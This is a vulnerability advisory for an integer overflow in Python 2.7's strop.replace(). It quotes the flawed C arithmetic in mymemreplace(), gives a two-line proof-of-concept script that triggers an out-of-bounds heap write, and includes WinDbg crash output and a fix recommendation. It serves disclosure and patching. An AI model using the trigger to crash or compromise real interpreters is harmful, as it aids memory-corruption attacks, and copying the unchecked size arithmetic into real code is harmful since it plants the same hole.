@@ -1,0 +1,224 @@
+Title: Python 2.7 strop.replace() Integer Overflow
+Credit: John Leitch (john@autosectools.com)
+Url1: http://autosectools.com/Page/Python-strop-replace-Integer-Overflow
+Url2: http://bugs.python.org/issue24708
+Resolution: Fixed
+
+The Python 2.7 strop.replace() method suffers from an integer overflow that can be exploited to write outside the bounds of the string buffer and potentially achieve code execution. The issue can be triggered by performing a large substitution that overflows the arithmetic used in mymemreplace() to calculate the size of the new string:
+
+static char *
+mymemreplace(const char *str, Py_ssize_t len,           /* input string */
+         const char *pat, Py_ssize_t pat_len,           /* pattern string to find */
+         const char *sub, Py_ssize_t sub_len,           /* substitution string */
+         Py_ssize_t count,                              /* number of replacements */
+         Py_ssize_t *out_len)
+{
+    [...]
+
+    new_len = len + nfound*(sub_len - pat_len); <<<< Unchecked arithmetic can overflow here.
+    if (new_len == 0) {
+        /* Have to allocate something for the caller to free(). */
+        out_s = (char *)PyMem_MALLOC(1);
+        if (out_s == NULL)
+            return NULL;
+        out_s[0] = '\0';
+    }
+    else {
+        assert(new_len > 0);
+        new_s = (char *)PyMem_MALLOC(new_len); <<<< An allocation is performed using overflowed value.
+        if (new_s == NULL)
+            return NULL;
+        out_s = new_s;
+
+        for (; count > 0 && len > 0; --count) { <<<< Memory is copied to new_s using len, which can be greater than the overflowed new_len value.
+            /* find index of next instance of pattern */
+            offset = mymemfind(str, len, pat, pat_len);
+            if (offset == -1)
+                break;
+
+            /* copy non matching part of input string */
+            memcpy(new_s, str, offset);
+            str += offset + pat_len;
+            len -= offset + pat_len;
+
+            /* copy substitute into the output string */
+            new_s += offset;
+            memcpy(new_s, sub, sub_len);
+            new_s += sub_len;
+        }
+        /* copy any remaining values into output string */
+        if (len > 0)
+            memcpy(new_s, str, len);
+    }
+    [...]
+}
+
+The following script demonstrates the issue:
+
+import strop
+strop.replace("\x75"*0xEAAA,"\x75","AA"*0xAAAA)
+When run under a debugger, it produces the following exception:
+
+0:000> r
+eax=01e4cfd0 ebx=5708fc94 ecx=00003c7a edx=00000000 esi=01e3dde8 edi=57096000
+eip=7026ae7a esp=0027fc98 ebp=0027fca0 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
+MSVCR90!memcpy+0x5a:
+7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+0:000> db edi-0x10
+57095ff0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+57096000  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+57096010  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+57096020  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+57096030  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+57096040  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+57096050  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+57096060  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+0:000> db esi
+01e3dde8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+01e3ddf8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+01e3de08  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+01e3de18  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+01e3de28  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+01e3de38  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+01e3de48  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+01e3de58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0:000> k
+ChildEBP RetAddr  
+0027fca0 1e056efc MSVCR90!memcpy+0x5a [f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm @ 188]
+0027fcd0 1e05700b python27!mymemreplace+0xfc [c:\build27\cpython\modules\stropmodule.c @ 1139]
+0027fd18 1e0aaed7 python27!strop_replace+0xbb [c:\build27\cpython\modules\stropmodule.c @ 1185]
+0027fd30 1e0edcc0 python27!PyCFunction_Call+0x47 [c:\build27\cpython\objects\methodobject.c @ 81]
+0027fd5c 1e0f012a python27!call_function+0x2b0 [c:\build27\cpython\python\ceval.c @ 4035]
+0027fdcc 1e0f1100 python27!PyEval_EvalFrameEx+0x239a [c:\build27\cpython\python\ceval.c @ 2684]
+0027fe00 1e0f1162 python27!PyEval_EvalCodeEx+0x690 [c:\build27\cpython\python\ceval.c @ 3267]
+0027fe2c 1e1170ca python27!PyEval_EvalCode+0x22 [c:\build27\cpython\python\ceval.c @ 674]
+0027fe44 1e118215 python27!run_mod+0x2a [c:\build27\cpython\python\pythonrun.c @ 1371]
+0027fe64 1e1187b0 python27!PyRun_FileExFlags+0x75 [c:\build27\cpython\python\pythonrun.c @ 1358]
+0027fea4 1e119129 python27!PyRun_SimpleFileExFlags+0x190 [c:\build27\cpython\python\pythonrun.c @ 950]
+0027fec0 1e038cb5 python27!PyRun_AnyFileExFlags+0x59 [c:\build27\cpython\python\pythonrun.c @ 753]
+0027ff3c 1d00116d python27!Py_Main+0x965 [c:\build27\cpython\modules\main.c @ 643]
+0027ff80 74b97c04 python!__tmainCRTStartup+0x10f [f:\dd\vctools\crt_bld\self_x86\crt\src\crtexe.c @ 586]
+0027ff94 7701ad1f KERNEL32!BaseThreadInitThunk+0x24
+0027ffdc 7701acea ntdll!__RtlUserThreadStart+0x2f
+0027ffec 00000000 ntdll!_RtlUserThreadStart+0x1b
+0:000> !analyze -v -nodb
+*******************************************************************************
+*                                                                             *
+*                        Exception Analysis                                   *
+*                                                                             *
+*******************************************************************************
+
+
+FAULTING_IP: 
+MSVCR90!memcpy+5a [f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm @ 188]
+7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+
+EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
+ExceptionAddress: 7026ae7a (MSVCR90!memcpy+0x0000005a)
+   ExceptionCode: c0000005 (Access violation)
+  ExceptionFlags: 00000000
+NumberParameters: 2
+   Parameter[0]: 00000001
+   Parameter[1]: 57096000
+Attempt to write to address 57096000
+
+CONTEXT:  00000000 -- (.cxr 0x0;r)
+eax=01e4cfd0 ebx=5708fc94 ecx=00003c7a edx=00000000 esi=01e3dde8 edi=57096000
+eip=7026ae7a esp=0027fc98 ebp=0027fca0 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
+MSVCR90!memcpy+0x5a:
+7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+
+FAULTING_THREAD:  00001408
+
+PROCESS_NAME:  python.exe
+
+ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
+
+EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
+
+EXCEPTION_PARAMETER1:  00000001
+
+EXCEPTION_PARAMETER2:  57096000
+
+WRITE_ADDRESS:  57096000 
+
+FOLLOWUP_IP: 
+MSVCR90!memcpy+5a [f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm @ 188]
+7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+
+NTGLOBALFLAG:  470
+
+APPLICATION_VERIFIER_FLAGS:  0
+
+APP:  python.exe
+
+ANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre
+
+BUGCHECK_STR:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_FILL_PATTERN_NXCODE
+
+PRIMARY_PROBLEM_CLASS:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE
+
+DEFAULT_BUCKET_ID:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE
+
+LAST_CONTROL_TRANSFER:  from 1e056efc to 7026ae7a
+
+STACK_TEXT:  
+0027fca0 1e056efc 5708fc94 01e37a7c 00015554 MSVCR90!memcpy+0x5a
+0027fcd0 1e05700b 01e2ba4e 38e171c8 01d244cc python27!mymemreplace+0xfc
+0027fd18 1e0aaed7 00000000 01cebe40 01de2c38 python27!strop_replace+0xbb
+0027fd30 1e0edcc0 01de2c38 01cebe40 00000000 python27!PyCFunction_Call+0x47
+0027fd5c 1e0f012a 0027fdb4 01ce6c80 01ce6c80 python27!call_function+0x2b0
+0027fdcc 1e0f1100 01ddd9d0 00000000 01ce6c80 python27!PyEval_EvalFrameEx+0x239a
+0027fe00 1e0f1162 01ce6c80 01ddd9d0 01ceaa50 python27!PyEval_EvalCodeEx+0x690
+0027fe2c 1e1170ca 01ce6c80 01ceaa50 01ceaa50 python27!PyEval_EvalCode+0x22
+0027fe44 1e118215 01dca090 01ceaa50 01ceaa50 python27!run_mod+0x2a
+0027fe64 1e1187b0 702c7408 00342ebb 00000101 python27!PyRun_FileExFlags+0x75
+0027fea4 1e119129 702c7408 00342ebb 00000001 python27!PyRun_SimpleFileExFlags+0x190
+0027fec0 1e038cb5 702c7408 00342ebb 00000001 python27!PyRun_AnyFileExFlags+0x59
+0027ff3c 1d00116d 00000002 00342e98 00341950 python27!Py_Main+0x965
+0027ff80 74b97c04 7ffde000 74b97be0 b4e726fd python!__tmainCRTStartup+0x10f
+0027ff94 7701ad1f 7ffde000 b723218a 00000000 KERNEL32!BaseThreadInitThunk+0x24
+0027ffdc 7701acea ffffffff 77000212 00000000 ntdll!__RtlUserThreadStart+0x2f
+0027ffec 00000000 1d001314 7ffde000 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+
+STACK_COMMAND:  .cxr 0x0 ; kb
+
+FAULTING_SOURCE_LINE:  f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm
+
+FAULTING_SOURCE_FILE:  f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm
+
+FAULTING_SOURCE_LINE_NUMBER:  188
+
+FAULTING_SOURCE_CODE:  
+No source found for 'f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm'
+
+
+SYMBOL_STACK_INDEX:  0
+
+SYMBOL_NAME:  msvcr90!memcpy+5a
+
+FOLLOWUP_NAME:  MachineOwner
+
+MODULE_NAME: MSVCR90
+
+IMAGE_NAME:  MSVCR90.dll
+
+DEBUG_FLR_IMAGE_TIMESTAMP:  51ea24a5
+
+FAILURE_BUCKET_ID:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE_c0000005_MSVCR90.dll!memcpy
+
+BUCKET_ID:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_FILL_PATTERN_NXCODE_msvcr90!memcpy+5a
+
+ANALYSIS_SOURCE:  UM
+
+FAILURE_ID_HASH_STRING:  um:string_dereference_fill_pattern_nxcode_c0000005_msvcr90.dll!memcpy
+
+FAILURE_ID_HASH:  {031149d8-0626-9042-d8b7-a1766b1c5514}
+
+Followup: MachineOwner
+---------
+
+To fix the issue, mymemreplace should validate that the computed value new_len has not overflowed. To do this, (new_len - len) / nfound should be compared to sub_len - pat_len. If that are not equal, an overflow has occurred. 
